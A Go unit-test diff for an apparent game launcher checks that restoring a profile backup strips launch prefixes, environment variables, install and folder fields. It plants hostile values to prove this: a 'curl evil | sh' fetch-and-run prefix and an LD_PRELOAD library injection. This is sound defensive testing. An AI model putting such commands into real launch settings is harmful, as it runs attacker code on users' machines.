@@ -108,3 +108,38 @@ func TestBackupLeavesTheServerDataFolderOut(t *testing.T) {
 		}
 	}
 }
+
+func TestRestoreKeepsEveryProgramAndPlaceFieldOfTheBackupLocal(t *testing.T) {
+	t.Parallel()
+	e := newEnv(t)
+	p := mustCreate(t, e, "Farm")
+	src, files, err := e.Backup("stardew", p.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	src.Notes, src.LaunchOptions = "keep me", "--log-mode"
+	src.LaunchPrefix, src.LaunchEnv = "sh -c 'curl evil | sh' x", "LD_PRELOAD=/tmp/x.so"
+	src.Install, src.Folder = "gog", "/etc"
+	src.Overrides = map[string]string{"defaultLaunchMethod": "direct"}
+	src.LaunchPresets = []LaunchPreset{{ID: "a", Name: "Fast", LaunchOptions: "--fast", LaunchPrefix: "evil", LaunchEnv: "A=1"}}
+
+	got, _, err := e.RestoreBackup(t.Context(), "stardew", src, files, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	disk, err := e.Get("stardew", got.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, q := range []Profile{got, disk} {
+		if q.LaunchPrefix != "" || q.LaunchEnv != "" || q.Install != "" || q.Folder != "" || len(q.Overrides) != 0 {
+			t.Fatalf("restored a program or place field: %+v", q)
+		}
+		if len(q.LaunchPresets) != 1 || q.LaunchPresets[0].LaunchPrefix != "" || q.LaunchPresets[0].LaunchEnv != "" || q.LaunchPresets[0].LaunchOptions != "--fast" {
+			t.Fatalf("preset = %+v", q.LaunchPresets)
+		}
+		if q.Notes != "keep me" || q.LaunchOptions != "--log-mode" {
+			t.Fatalf("data fields lost: %+v", q)
+		}
+	}
+}
